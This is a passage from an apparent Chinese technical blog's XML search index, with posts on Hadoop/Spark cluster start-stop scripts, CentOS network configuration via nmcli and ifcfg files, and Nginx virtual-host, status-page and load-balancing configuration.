title="五、启动/停止集群"></a>五、启动/停止集群</h2><ol><li>启动脚本（<strong>start-cluster.sh</strong>）</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">echo</span> -e <span class="token string">"\033[31m ========Start The Cluster======== \033[0m"</span><span class="token keyword">echo</span> -e <span class="token string">"\033[31m Starting Hadoop Now !!! \033[0m"</span>/opt/hadoop-2.7.3/sbin/start-all.sh<span class="token keyword">echo</span> -e <span class="token string">"\033[31m Starting Spark Now !!! \033[0m"</span>/opt/spark-3.1.1-bin-hadoop2.7/sbin/start-all.sh<span class="token keyword">echo</span> -e <span class="token string">"\033[31m The Result Of The Command \"jps\" :  \033[0m"</span>jps<span class="token keyword">echo</span> -e <span class="token string">"\033[31m ========END======== \033[0m"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>停止脚本（<strong>stop-cluser.sh</strong>）</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">echo</span> -e <span class="token string">"\033[31m ===== Stoping The Cluster ====== \033[0m"</span><span class="token keyword">echo</span> -e <span class="token string">"\033[31m Stoping Spark Now !!! \033[0m"</span>/opt/spark-3.1.1-bin-hadoop2.7/sbin/stop-all.sh<span class="token keyword">echo</span> -e <span class="token string">"\033[31m Stopting Hadoop Now !!! \033[0m"</span>/opt/hadoop-2.7.3/sbin/stop-all.sh<span class="token keyword">echo</span> -e <span class="token string">"\033[31m The Result Of The Command \"jps\" :  \033[0m"</span>jps<span class="token keyword">echo</span> -e <span class="token string">"\033[31m ======END======== \033[0m"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2>]]></content>
      
      
      <categories>
          
          <category> 云计算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
            <tag> Spark </tag>
            
            <tag> 架构 </tag>
            
            <tag> 集群 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos/RHEL网络配置</title>
      <link href="/post/926aba6d.html"/>
      <url>/post/926aba6d.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、基本命令"><a href="#一、基本命令" class="headerlink" title="一、基本命令"></a>一、基本命令</h3><p>查看网络状态：<strong>ip address</strong><br>重启网络服务(不会立即生效)：<strong>nmcli c reload</strong><br>关闭所有接口：<strong>nmcli n off</strong><br>开启所有接口：<strong>nmcli n on</strong><br>获取网络连接状态：<strong>nmcli n connectivity</strong><br>none: 主机为连接到任何网络<br>portal: 无法到达完整的互联网<br>limited: 主机已连接到网络，但无法访问互联网<br>full: 主机连接到网络，并具有完全访问<br>unknown: 无法找到连接状态<br>立即生效 connection，有 3 种方法</p><pre class="line-numbers language-bash"><code class="language-bash">nmcli c up ens33nmcli d reapply ens33nmcli d connect ens33<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="二、配置动态-IP"><a href="#二、配置动态-IP" class="headerlink" title="二、配置动态 IP"></a>二、配置动态 IP</h3><p>配置文件：<code>/etc/sysconfig/network-scripts/ifcfg-ens33</code><br>文件名称是：<code>ifcfg-{网卡名称}</code></p><pre class="line-numbers language-bash"><code class="language-bash">TYPE<span class="token operator">=</span>EthernetPROXY_METHOD<span class="token operator">=</span>noneBROWSER_ONLY<span class="token operator">=</span>noBOOTPROTO<span class="token operator">=</span>dhcp                <span class="token comment" spellcheck="true"># DHCP自动获取IP</span>DEFROUTE<span class="token operator">=</span>yesIPV4_FAILURE_FATAL<span class="token operator">=</span>noIPV6INIT<span class="token operator">=</span>yesIPV6_AUTOCONF<span class="token operator">=</span>yesIPV6_DEFROUTE<span class="token operator">=</span>yesIPV6_FAILURE_FATAL<span class="token operator">=</span>noIPV6_ADDR_GEN_MODE<span class="token operator">=</span>stable-privacyNAME<span class="token operator">=</span>ens33UUID<span class="token operator">=</span>0be22931-2f93-49ba-a410-6d366009dd1eDEVICE<span class="token operator">=</span>ens33ONBOOT<span class="token operator">=</span>yes                <span class="token comment" spellcheck="true"># 开机自动启用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、配置静态-IP"><a href="#三、配置静态-IP" class="headerlink" title="三、配置静态 IP"></a>三、配置静态 IP</h3><p>配置文件：<code>/etc/sysconfig/network-scripts/ifcfg-ens33</code><br>文件名称是：<code>ifcfg-{网卡名称}</code></p><pre class="line-numbers language-bash"><code class="language-bash">TYPE<span class="token operator">=</span>EthernetPROXY_METHOD<span class="token operator">=</span>noneBROWSER_ONLY<span class="token operator">=</span>noBOOTPROTO<span class="token operator">=</span>static           <span class="token comment" spellcheck="true"># 静态IP</span>DEFROUTE<span class="token operator">=</span>yesIPV4_FAILURE_FATAL<span class="token operator">=</span>noIPV6INIT<span class="token operator">=</span>yesIPV6_AUTOCONF<span class="token operator">=</span>yesIPV6_DEFROUTE<span class="token operator">=</span>yesIPV6_FAILURE_FATAL<span class="token operator">=</span>noIPV6_ADDR_GEN_MODE<span class="token operator">=</span>stable-privacyNAME<span class="token operator">=</span>ens33UUID<span class="token operator">=</span>0be22931-2f93-49ba-a410-6d366009dd1eDEVICE<span class="token operator">=</span>ens33ONBOOT<span class="token operator">=</span>yesIPADDR<span class="token operator">=</span>9.0.0.3          <span class="token comment" spellcheck="true"># 设置IP地址</span>NETMASK<span class="token operator">=</span>255.255.255.0   <span class="token comment" spellcheck="true"># 设置子网掩码</span>GATEWAY<span class="token operator">=</span>9.0.0.2         <span class="token comment" spellcheck="true"># 设置网关</span>DNS1<span class="token operator">=</span>9.0.0.2                        <span class="token comment" spellcheck="true"># 设置dns1</span>DNS2<span class="token operator">=</span>8.8.8.8                        <span class="token comment" spellcheck="true"># 设置dns2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
            <tag> 网络配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx配置</title>
      <link href="/post/ad720447.html"/>
      <url>/post/ad720447.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、启动、停止、重启"><a href="#一、启动、停止、重启" class="headerlink" title="一、启动、停止、重启"></a>一、启动、停止、重启</h2><h3 id="1-启动"><a href="#1-启动" class="headerlink" title="1. 启动"></a>1. 启动</h3><h4 id="systemctl-start-nginx"><a href="#systemctl-start-nginx" class="headerlink" title="systemctl start nginx"></a><em>systemctl start nginx</em></h4><h3 id="2-重启"><a href="#2-重启" class="headerlink" title="2. 重启"></a>2. 重启</h3><h4 id="systemctl-restart-nginx"><a href="#systemctl-restart-nginx" class="headerlink" title="systemctl restart nginx"></a><em>systemctl restart nginx</em></h4><h3 id="3-停止"><a href="#3-停止" class="headerlink" title="3. 停止"></a>3. 停止</h3><h4 id="systemctl-stop-nginx"><a href="#systemctl-stop-nginx" class="headerlink" title="systemctl stop nginx"></a><em>systemctl stop nginx</em></h4><p>_</p><h2 id="二、查看-Nginx-状态"><a href="#二、查看-Nginx-状态" class="headerlink" title="二、查看 Nginx 状态"></a>二、查看 Nginx 状态</h2><h3 id="1-服务状态"><a href="#1-服务状态" class="headerlink" title="1. 服务状态"></a>1. 服务状态</h3><h4 id="systemctl-status-nginx"><a href="#systemctl-status-nginx" class="headerlink" title="systemctl status nginx"></a><em>systemctl status nginx</em></h4><h3 id="3-监听状态"><a href="#3-监听状态" class="headerlink" title="3. 监听状态"></a>3. 监听状态</h3><h4 id="netstat-nplt"><a href="#netstat-nplt" class="headerlink" title="netstat -nplt"></a><em>netstat -nplt</em></h4><p>_</p><h2 id="三、nginx-虚拟主机-站点-配置"><a href="#三、nginx-虚拟主机-站点-配置" class="headerlink" title="三、nginx 虚拟主机(站点)配置"></a>三、nginx 虚拟主机(站点)配置</h2><h3 id="1-主配置文件-etc-nginx-nginx-conf"><a href="#1-主配置文件-etc-nginx-nginx-conf" class="headerlink" title="1. 主配置文件/etc/nginx/nginx.conf"></a>1. 主配置文件/etc/nginx/nginx.conf</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token comment" spellcheck="true"># 指该服务进程用户身份</span><span class="token keyword">user</span>  nginx<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 指定工作进程数量(一般对应CPU核数)</span><span class="token comment" spellcheck="true"># worker_processes  auto;</span><span class="token keyword">worker_processes</span>  <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 亲核(特定的CPU调度特定的进程 无需切换提高效率)</span><span class="token comment" spellcheck="true"># worker_cpu_affinity auto;</span><span class="token keyword">worker_cpu_affinity</span> <span class="token number">0001</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 进程最大打开文件数(连接，此处必须修改内核的限制也必须支持该数值，内核限制默认1024，最大50000)</span><span class="token keyword">worker_rlimit_nofile</span> <span class="token number">1024</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 指定警告及以上级别的信息 日志文件</span><span class="token keyword">error_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log warn<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 指定存在进程号 的文件</span><span class="token keyword">pid</span>        <span class="token operator">/</span>var<span class="token operator">/</span>run<span class="token operator">/</span>nginx<span class="token punctuation">.</span><span class="token keyword">pid</span><span class="token punctuation">;</span><span class="token keyword">events</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true"># 进程最大连接数</span>    <span class="token keyword">worker_connections</span>  <span class="token number">1024</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># 事件并发机制(poll、select、epoll) 用epoll机制(linux下最佳方式)</span>    <span class="token keyword">use</span>  epoll<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># 防止惊群</span>    <span class="token keyword">multi_accept</span> on<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">http</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true"># 包含 文件属性 文件</span>    <span class="token keyword">include</span>       <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>mime<span class="token punctuation">.</span><span class="token keyword">types</span><span class="token punctuation">;</span>    <span class="token keyword">default_type</span>  application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># 指定日志信息格式</span>    <span class="token keyword">log_format</span>  main  <span class="token string">'$remote_addr - $remote_user [$time_local] "$request" '</span>                      <span class="token string">'$status $body_bytes_sent "$http_referer" '</span>                      <span class="token string">'"$http_user_agent" "$http_x_forwarded_for"'</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true"># 使用“main”格式记录日志到指定文件</span>    <span class="token keyword">access_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># 开启快速发送文件方式</span>    <span class="token keyword">sendfile</span>        on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nopush</span>      on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># 连接超时事件</span>    <span class="token keyword">keepalive_timeout</span>  <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># 压缩（优化选项）</span>    <span class="token keyword">gzip</span>  on<span class="token punctuation">;</span>    <span class="token keyword">gzip_min_length</span>   2K<span class="token punctuation">;</span>    <span class="token keyword">gzip_buffers</span>      <span class="token number">4</span> 16k<span class="token punctuation">;</span>    <span class="token keyword">gzip_comp_level</span>   <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">gzip_types</span> text<span class="token operator">/</span>plain application<span class="token operator">/</span>x<span class="token operator">-</span>javascript text<span class="token operator">/</span>css application<span class="token operator">/</span>xml text<span class="token operator">/</span>html<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># 包含子配置文件</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-子配置文件-etc-nginx-conf-d-upl-conf"><a href="#2-子配置文件-etc-nginx-conf-d-upl-conf" class="headerlink" title="2. 子配置文件/etc/nginx/conf.d/upl.conf"></a>2. 子配置文件/etc/nginx/conf.d/upl.conf</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token comment" spellcheck="true">#虚拟主机</span><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">#监听在哪个端口</span>    <span class="token keyword">listen</span>       <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># 虚拟主机名称（站点域名）</span>    <span class="token keyword">server_name</span>  bbs<span class="token punctuation">.</span>upl<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#指定字符集</span>    <span class="token keyword">charset</span> utf<span class="token number">-8</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#指定访问日志信息文件</span>    <span class="token keyword">access_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>upl<span class="token punctuation">.</span>access<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">#通用匹配项</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">#指定站点根目录&lt;起始目录></span>        <span class="token keyword">root</span>   <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>upl<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#指定自动索引页面</span>        <span class="token keyword">index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">#设置某个目录列出文件信息 提供下载</span>      <span class="token comment" spellcheck="true">#当用户访问bbs.upl.com/download/ 则匹配该项</span>    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span>download<span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">root</span>   <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>upl<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#列出该目录底下的所有文件&lt;用于资源下载></span>        <span class="token keyword">autoindex</span> on<span class="token punctuation">;</span>        <span class="token keyword">autoindex_exact_size</span> on<span class="token punctuation">;</span>        autoindex_format html<span class="token punctuation">;</span>        <span class="token keyword">autoindex_localtime</span> on<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#账号授权控制</span>        <span class="token keyword">auth_basic</span>  <span class="token string">"This You Need Input Pas:"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#指定授权用户密码文件 文件格式为  user:passwd  其中密码为密文密码</span>        <span class="token comment" spellcheck="true">#生成密码openssl passwd  （注意新版本nginx只支持密文密码）</span>        <span class="token keyword">auth_basic_user_file</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>upl<span class="token punctuation">.</span>com<span class="token operator">/</span>password<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">#查看nginx服务状态  /NginxStatus并不时站点中的实际文件或目录只作为访问配置localtion</span>    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span>NginxStatus <span class="token punctuation">{</span>        <span class="token keyword">stub_status</span> on<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token operator">--</span>开启状态查询        <span class="token keyword">access_log</span>  off<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token operator">--</span>查询状态不写日志        <span class="token keyword">allow</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">64.1</span><span class="token punctuation">;</span>        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">##########状态信息#####################</span>        Active connections<span class="token punctuation">:</span> <span class="token number">1</span>     <span class="token operator">--</span><span class="token operator">-</span>活跃的连接数        <span class="token keyword">server</span> accepts handled requests             <span class="token number">2</span>            <span class="token number">2</span>            <span class="token number">6</span>    <span class="token operator">--</span><span class="token operator">--</span>接受连接数  处理成功的连接数   接受请求数        Reading<span class="token punctuation">:</span> <span class="token number">0</span> Writing<span class="token punctuation">:</span> <span class="token number">1</span> Waiting<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token operator">--</span><span class="token operator">-</span>读取客户端的连接数   响应数据到客户端的数量  nginx已经处理完成正在等候下一次请求指令的数量    <span class="token comment" spellcheck="true">####################################</span>    <span class="token comment" spellcheck="true">#404 403错误配置项</span>    <span class="token keyword">error_page</span>  <span class="token number">404</span>  <span class="token number">403</span>             <span class="token operator">/</span><span class="token number">404</span><span class="token punctuation">.</span>html<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span><span class="token number">404</span><span class="token punctuation">.</span>html <span class="token punctuation">{</span>        <span class="token keyword">root</span>  <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>upl<span class="token punctuation">.</span>com<span class="token operator">/</span>error<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#500 502 503 504错误匹配项</span>    <span class="token comment" spellcheck="true"># redirect server error pages to the static page /50x.html</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">error_page</span>   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  <span class="token operator">/</span>50x<span class="token punctuation">.</span>html<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span>50x<span class="token punctuation">.</span>html <span class="token punctuation">{</span>        <span class="token keyword">root</span>   <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>nginx<span class="token operator">/</span>html<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：</p><ul><li>只要修改过 nginx 配置文件必须重启服务才能生效</li><li><strong>systemctl restart nginx</strong>&nbsp; 或者<strong>systemctl &nbsp;reload nginx</strong></li><li><strong>nginx -t</strong> &nbsp; 检查配置文件的语法</li></ul><h2 id="四、负载均衡"><a href="#四、负载均衡" class="headerlink" title="四、负载均衡"></a>四、负载均衡</h2><p>参考：<a href="https://docshome.gitbook.io/nginx-docs/readme/shi-yong-nginx-zuo-wei-http-fu-zai-jun-heng-qi">使用 Nginx 作为 HTTP 负载均衡服务器</a></p><h3 id="1-负载均衡方法"><a href="#1-负载均衡方法" class="headerlink" title="1. 负载均衡方法"></a>1. 负载均衡方法</h3><p>nginx 支持以下负载均衡机制（或方法）：</p><ul><li><p><strong>轮询（**<strong>round-robin*</strong>*）</strong> - 发送给应用服务器的请求以轮询的方式分发</p></li><li><p><strong>最少连接（**<strong>least-connected*</strong>*）</strong> - 下一个请求被分配给具有最少数量活动连接的服务器</p></li><li><p><strong>ip 哈希（**<strong>ip-hash*</strong>*）</strong> - 使用哈希函数确定下一个请求应该选择哪一个服务器（基于客户端的 IP 地址）</p></li></ul><h3 id="2-默认负载均衡配置"><a href="#2-默认负载均衡配置" class="headerlink" title="2. 默认负载均衡配置"></a>2. 默认负载均衡配置</h3><p>使用 nginx 进行负载均衡的最简单配置如下所示：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">http</span> <span class="token punctuation">{</span>    <span class="token keyword">upstream</span> myapp1 <span class="token punctuation">{</span>        <span class="token keyword">server</span> srv1<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token keyword">server</span> srv2<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token keyword">server</span> srv3<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">server</span> <span class="token punctuation">{</span>        <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>        <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>            <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>myapp1<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-优化性配置"><a href="#3-优化性配置" class="headerlink" title="3. 优化性配置"></a>3. 优化性配置</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">upstream</span> app <span class="token punctuation">{</span>    <span class="token keyword">server</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.100</span><span class="token punctuation">:</span><span class="token number">8000</span> weight<span class="token operator">=</span><span class="token number">1</span> max_fails<span class="token operator">=</span><span class="token number">3</span> fail_timeout<span class="token operator">=</span>10s<span class="token punctuation">;</span>    <span class="token keyword">server</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.101</span><span class="token punctuation">:</span><span class="token number">8000</span> weight<span class="token operator">=</span><span class="token number">1</span> max_fails<span class="token operator">=</span><span class="token number">3</span> fail_timeout<span class="token operator">=</span>10s<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> www<span class="token punctuation">.</span>app<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">charset</span> utf<span class="token number">-8</span><span class="token punctuation">;</span>    <span class="token keyword">access_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>app<span class="token punctuation">.</span>access<span class="token punctuation">.</span>log main<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>app<span class="token punctuation">;</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Real<span class="token operator">-</span>IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_redirect</span> off<span class="token punctuation">;</span>        <span class="token keyword">proxy_connect_timeout</span> <span class="token number">30</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_send_timeout</span> <span class="token number">15</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_read_timeout</span> <span class="token number">15</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-PHP-负载均衡"><a href="#3-PHP-负载均衡" class="headerlink" title="3. PHP 负载均衡"></a>3. PHP 负载均衡</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">upstream</span> phpServer <span class="token punctuation">{</span>    <span class="token keyword">ip_hash</span><span class="token punctuation">;</span>    <span class="token keyword">server</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.130</span><span class="token punctuation">:</span><span class="token number">9000</span> max_fails<span class="token operator">=</span><span class="token number">3</span> fail_timeout<span class="token operator">=</span>10s<span class="token punctuation">;</span>    <span class="token keyword">server</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">198.131</span><span class="token punctuation">:</span><span class="token number">9000</span> max_fails<span class="token operator">=</span><span class="token number">3</span> fail_timeout<span class="token operator">=</span>10s<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#=== Fastcgi Config ===</span><span class="token keyword">fastcgi_connect_timeout</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">fastcgi_send_timeout</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">fastcgi_read_timeout</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">fastcgi_buffer_size</span>  64k<span class="token punctuation">;</span><span class="token keyword">fastcgi_buffers</span> <span class="token number">4</span> 64k<span class="token punctuation">;</span><span class="token keyword">fastcgi_busy_buffers_size</span> 128k<span class="token punctuation">;</span><span class="token keyword">fastcgi_temp_file_write_size</span> 128k<span class="token punctuation">;</span><span class="token keyword">location</span> <span class="token operator">~</span> \<span class="token punctuation">.</span><span class="token punctuation">(</span>php<span class="token operator">|</span>php5<span class="token punctuation">)</span>$ <span class="token punctuation">{</span>    <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>www<span class="token punctuation">.</span>app<span class="token punctuation">.</span>com<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_pass</span> phpServer<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_param</span> SCRIPT_FILENAME <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> fastcgi_params<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span>php<span class="token operator">/</span> <span class="token punctuation">{</span>  <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>www<span class="token punctuation">.</span>app<span class="token punctuation">.</span>com<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_pass</span> phpServer<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>  <span class="token keyword">fastcgi_param</span> SCRIPT_FILENAME <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> fastcgi_params<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scala入门</title>
      <link href="/post/54925234.html"/>
      <url>/post/54925234.html</url>
      
